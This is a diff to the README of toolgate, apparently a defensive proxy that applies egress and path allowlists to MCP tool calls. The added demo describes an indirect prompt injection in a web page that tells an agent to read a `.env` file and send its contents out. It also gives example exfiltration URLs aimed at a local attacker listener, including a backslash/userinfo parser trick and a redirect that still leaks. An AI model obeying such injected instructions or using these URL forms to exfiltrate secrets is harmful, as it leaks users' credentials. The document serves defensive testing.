@@ -28,15 +28,19 @@ This repository does two things:
 > adapters, a fusion/policy engine, a decontaminated 337-item corpus from three
 > independent attack sources, matched-FPR calibration, leave-one-source-out,
 > latency and dilution benchmarks, capability gating of outbound tool calls,
-> and integrity gating of inbound tool declarations. 1,004 tests: 980 run in
-> CI, and 24 more need the unpublished weights. CI is green. The full evidence
+> integrity gating of inbound tool declarations, and `toolgate wrap`, a
+> standalone stdio proxy that puts the capability rules in front of any MCP
+> server a host starts. 1,435 tests: 1,411 run without the unpublished
+> weights (a few only on Windows or only on POSIX), 24 more need them. The
+> full evidence
 > is in [`docs/REPORT.md`](docs/REPORT.md) and
 > [`docs/DECLARATION-CHURN.md`](docs/DECLARATION-CHURN.md); a short version
 > follows.
 >
-> One planned piece, an optional standalone stdio proxy, is not started. A
-> session-level correlation layer was built, measured, found unable to detect
-> the threat it targeted, and removed. The finding is kept in
+> `toolgate wrap` is v0.1, not yet published on PyPI: see
+> [Use it: `toolgate wrap`](#use-it-toolgate-wrap). A session-level
+> correlation layer was built, measured, found unable to detect the threat it
+> targeted, and removed. The finding is kept in
 > [`docs/DILUTION-BENCHMARK.md`](docs/DILUTION-BENCHMARK.md).
 
 ## Headline result
@@ -126,12 +130,189 @@ classified.
 **What it does not do.** It bounds the blast radius of a successful injection
 to whatever the policy still permits. An attacker who only needs a tool the
 policy allows is unaffected. This narrows what a compromised agent can reach;
-it does not stop the compromise. Blocking is enforced by raising at the
-transport boundary, so the request never reaches the server.
+it does not stop the compromise. In the in-process path, blocking is enforced
+by raising at the transport boundary; in `toolgate wrap`, the proxy answers
+the call itself. Either way the request never reaches the server.
 
 Capability gating ships off in the default profile, so adding it changed
 nothing for anyone who has not opted in. `config/policy.agent.yaml` is a
 working example scoped to the reference servers.
+
+## Use it: `toolgate wrap`
+
+`toolgate wrap` runs one stdio MCP server behind these rules. You put it in
+front of the server's command in your host's config; the host talks to
+toolgate, toolgate talks to the server.
+
+```
+host (Claude Code) <--stdio--> toolgate wrap --name fetch --config fetch.yaml -- <server command>
+```
+
+### Who v0.1 is for
+
+Agents whose legitimate destinations you can list: your own API, a fixed set
+of docs sites, GitHub. For those, an egress allowlist is a real bound. An
+agent that must browse arbitrary sites does not fit an allowlist: you would
+either break it or loosen the rule to `*`, and `*` protects nothing. That
+case needs a different control (a session-level rule that tightens egress
+once untrusted content has been read), which is planned, not built. Two
+example policies for the workflows v0.1 fits:
+[`examples/internal-api.yaml`](examples/internal-api.yaml) and
+[`examples/docs-and-github.yaml`](examples/docs-and-github.yaml).
+
+### The guarantee, with its scope
+
+**A `tools/call` to a server wrapped by toolgate, whose URL argument names a
+host outside that tool's egress allowlist, never reaches the server, whatever
+prose led the model to make it.** The same holds for path arguments outside a
+tool's `paths` globs and for tools configured `action: block`.
+
+It holds because nothing is classified. The URL is parsed strictly and
+compared with the list by host label and port. Anything two URL parsers could
+read differently (a backslash, userinfo, whitespace, non-ASCII, numeric host
+spellings) is refused rather than interpreted. Every client line is parsed
+strictly too: duplicate keys, a byte-order mark, two objects on one line or a
+batch are refused, never forwarded, so a lenient server cannot be handed a
+tool call the proxy did not see. The refused call gets an error result naming
+the rule (`Blocked by toolgate policy: rule fetch.fetch.egress`); the argument
+is never echoed and never logged.
+
+**What it does not cover**, measured or stated rather than assumed:
+
+- **Servers you did not wrap, and tools with no `paths`/`egress` rule.** The
+  startup line in the host's server log says how many tools the policy covers:
+  `toolgate[fetch]: 1 of 1 tools constrained (default: block); audit: ...`.
+- **Redirects the server follows itself.** Probed on 2026-10-03:
+  `mcp-server-fetch` follows a 302 from an allowed host to any other host.
+  toolgate checks the URL it is given, so an allowed page that redirects
+  leaks. The demo below shows this case rather than hiding it. Containment
+  (an OS sandbox, Docker MCP Gateway) covers it; toolgate does not.
+- **Exfiltration through an allowed host**, such as a gist or an issue comment
+  on an allowlisted GitHub.
+- **Traffic a server originates on its own**, and shell or exec tools whose
+  network access is not an argument.
+- **PII redaction covers `tools/call` results only.** `resources/read`,
+  `prompts/get` and notifications pass unredacted.
+- **Paths are compared as text.** Symlinks are not resolved, so a symlink
+  inside an allowed directory pointing outside it is not caught here
+  (`server-filesystem` resolves real paths itself).
+- **Tool descriptions are not pinned in the proxy yet.** Declaration pinning
+  exists in the in-process path (below) but not in `wrap` v0.1.
+
+**Ports are part of every entry.** `example.com` allows only port 80 for
+`http` and 443 for `https` (an explicit `:443` counts the same). Write
+`example.com:8080` for one other port or `example.com:*` for any.
+`*.example.com` matches any host below `example.com`, not `example.com`
+itself.
+
+**Arguments the rule cannot classify fail closed.** For a tool with a `paths`
+or `egress` rule, every argument in the tool's declared schema that could hold
+a string must be named in `path_args`, `url_args` or `ignore_args` (defaults:
+`path`, `paths`, `source`, `destination` and `url`, `uri`, `href`). A tool
+with an unnamed one is withheld from the host's tool list and stderr says
+which argument to add; an argument the schema does not declare is refused.
+
+### Quickstart (Claude Code)
+
+v0.1 is not on PyPI yet. Until `0.1.0a1` is published, install from git and
+replace `toolgate@0.1.0a1` below with
+`--from git+https://github.com/CodeByHashir/toolgate toolgate`.
+
+1. Write a policy, e.g. `fetch.yaml`, starting from one of the examples:
+
+   ```yaml
+   tool_calls:
+     default: block
+     rules:
+       fetch.fetch:
+         egress: ["docs.python.org", "api.internal.example:8443"]
+   ```
+
+2. Put `toolgate wrap` in front of the server, pinned to a version, in
+   `.mcp.json`:
+
+   ```json
+   {
+     "mcpServers": {
+       "fetch": {
+         "command": "uvx",
+         "args": [
+           "toolgate@0.1.0a1", "wrap", "--name", "fetch",
+           "--config", "/absolute/path/to/fetch.yaml",
+           "--", "uvx", "mcp-server-fetch==2026.8.18"
+         ]
+       }
+     }
+   }
+   ```
+
+   Pin the version: unpinned, a broken release could stop every wrapped
+   server the next time the host starts. Upgrade by changing the version in
+   the snippet.
+
+3. `--name` becomes the `<server>` in rule keys (`fetch.fetch` is server
+   `fetch`, tool `fetch`). The config comes from `--config` or
+   `$TOOLGATE_CONFIG`, never from the working directory. In a policy file,
+   `sandbox:`, `state_dir:` and `audit_path:` accept `~` and `${NAME}`;
+   relative values are resolved against the config file.
+
+To remove toolgate, delete everything up to and including the `--` from the
+args. The snippet is written for Claude Code, the host the demo targets, and
+Claude Code has run through `toolgate wrap` end to end in the recorded demo
+below (headless, with an MCP config file of this shape and the source-tree
+toolgate rather than the PyPI package). Claude Desktop and Cursor snippets
+will be added once each has been run, and are not listed until then.
+
+**Exit codes**: `0` the host closed the session; `1` config missing or
+invalid, server never started (the reason is on stderr); `2` the server
+failed to start or exited first; `3` internal error, including ten audit-log
+write failures in a row.
+
+**See what was blocked.** Each wrapped server writes its own SQLite log; the
+path is in the startup line. Rows hold rule ids, hashes and timings, never
+arguments or results:
+
+```bash
+sqlite3 "<state_dir>/audit/fetch.sqlite" "SELECT timestamp, tool_name, note FROM decision_log WHERE fused_decision = 'block' ORDER BY id DESC LIMIT 20"
+```
+
+Each direction is processed one line at a time, in order. Measured on the
+Windows dev machine with the egress rule, `rules_mcp` and `pii` enabled
+([`docs/PROXY-LATENCY.md`](docs/PROXY-LATENCY.md)): the proxy adds 1.7 ms at
+p99 to a call with a 1 KB result, and about 52 ms at p99 with a 100 KB result.
+Almost all of the second figure is the two detectors scanning 100 KB; a
+policy without redaction or injection detectors does not pay it. The
+transformer detectors, if you opt in, add around 170 ms each.
+
+### The demo: cross-server exfiltration, toolgate off and on
+
+Two real servers: `filesystem` scoped to a demo project whose `.env` holds a
+canary token, and `fetch`. A local page carries an indirect injection: read
+`.env`, then fetch an attacker URL with its contents. A scripted client makes
+exactly those calls; no model is involved, so this proves what the proxy
+does, not what a model would do. Recorded on the Windows dev machine with the
+pinned servers ([`tests/test_demo_fixtures.py`](tests/test_demo_fixtures.py),
+[`tests/test_proxy_e2e.py`](tests/test_proxy_e2e.py)):
+
+| Second call | toolgate off | toolgate on (`egress: ["localhost:<page port>"]`) |
+|---|---|---|
+| `http://127.0.0.1:<attacker>/?d=<.env>` | canary reaches the listener | refused, `fetch.fetch.egress`; listener receives nothing |
+| `http://127.0.0.1:<attacker>\@localhost:<page>/?d=...` | canary reaches the listener | refused; listener receives nothing |
+| `http://localhost:<attacker port>/?d=...` | canary reaches the listener | refused (port not allowed); listener receives nothing |
+| allowed page that answers 302 to the attacker | canary reaches the listener | **canary still reaches the listener** (not covered, see above) |
+
+The reads and the allowed page fetch work the same with toolgate on, and
+every line toolgate does not need to change is forwarded byte-for-byte: a
+session through `@modelcontextprotocol/server-everything`, covering sampling,
+elicitation, roots, resources, prompts, logging and progress, is compared as
+raw bytes in both directions
+([`tests/test_proxy_transparency.py`](tests/test_proxy_transparency.py)).
+**A real agent, once each way** ([`docs/AGENT-DEMO.md`](docs/AGENT-DEMO.md)):
+Claude Code with Sonnet 5.5, given only the two servers and the task
+"summarise the page", recognised the injection and declined it in both the
+toolgate-off and the toolgate-on run. So that recording does not show toolgate
+stopping anything; the model never made the call. It does show a real host
+session working through `toolgate wrap`. Two single runs, not a rate.
 
 ## The third channel: tool declarations
 
@@ -251,7 +432,7 @@ assertion in [`tests/test_paper_techniques.py`](tests/test_paper_techniques.py).
 | Channel | Direction | Mechanism | Guarantee |
 |---|---|---|---|
 | Tool **results** | server → client | Detection (six detectors, fused) | None. ~20% recall, measured and published |
-| Tool **calls** | client → server | Capability rules | No false-negative rate against the behaviour a rule names |
+| Tool **calls** | client → server | Capability rules, in-process or via `toolgate wrap` | No false-negative rate against the behaviour a rule names |
 | Tool **declarations** | server → client | Per-field integrity pinning | Detects post-approval change, by construction. Says nothing about first sight |
 
 Two of the three need no classifier, which is the whole argument. Where
@@ -273,8 +454,19 @@ reports the gap between them as a first-class result.
 Requires Python 3.11 and [uv](https://docs.astral.sh/uv/).
 
 ```bash
-uv sync --extra dev
+uv sync --extra dev --extra research
 ```
+
+The `research` extra holds what reproducing the measurements needs: numpy,
+scipy, scikit-learn, PyTorch, transformers, statsmodels, datasketch and the
+Anthropic SDK. Every command from here on (`verify-models`, `corpus-ingest`,
+`gauge-run`, `gauge-recut`, `run-agent` and the scripts under `scripts/`)
+needs it; the `toolgate` subcommands say so if it is missing. Without it,
+`uv sync --extra dev` installs the gating layer and the dev tools only, which
+is how the slim CI job runs the gating tests. `toolgate wrap` needs nothing
+beyond the base install, which is `mcp`, `pydantic`, `pyyaml`, `anyio` and
+`platformdirs`; a test checks that importing it loads none of the research
+stack.
 
 ## Detector artifacts
 
